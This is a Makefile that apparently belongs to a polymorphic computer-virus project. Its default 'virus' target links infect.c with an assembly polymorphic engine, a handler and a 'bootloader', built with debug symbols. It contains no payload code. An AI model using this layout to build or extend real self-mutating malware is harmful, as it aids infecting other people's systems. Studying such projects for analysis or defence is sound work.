# compile level development - with debuging symbols intact

ASM = nasm
CC = gcc
LCC = ld
AFLAGS = -felf64 -g -F dwarf 

CFLAGS = -c -nostartfiles -Wall -O2 -g   -m64

LFLAGS = -no-pie 
KFLAGS = -no-pie -nostartfiles -m64 -g -falign-functions=16 
CKFLAGS = -no-pie -nostartfiles  -m64 -g -falign-functions=16 
MFLAGS = -no-pie -r -nostdlib
MCFLAGS = -no-pie -r -nostdlib
all: virus

# C CODE
virus: infect.c turbopolymorphic.o
	$(CC) $(KFLAGS) $^ -o $@	

turbopolymorphic.o: polymorphicengine.o polymorphichandler.o bootloader.o
	$(LCC) $(MFLAGS) $^ -o $@
# C CODE

polymorphichandler.o: polymorphichandler.c
	$(CC) $(CFLAGS) $^ -o $@

polymorphic.o: polymorphicengine.o bootloader.o
	$(LCC) $(MFLAGS) $^ -o $@

bootloader.o: bootloader.asm template.asm.inc
	$(ASM) $(AFLAGS) $< -o $@

polymorphicengine.o: polymorphicengine.asm
	$(ASM) $(AFLAGS) $< -o $@

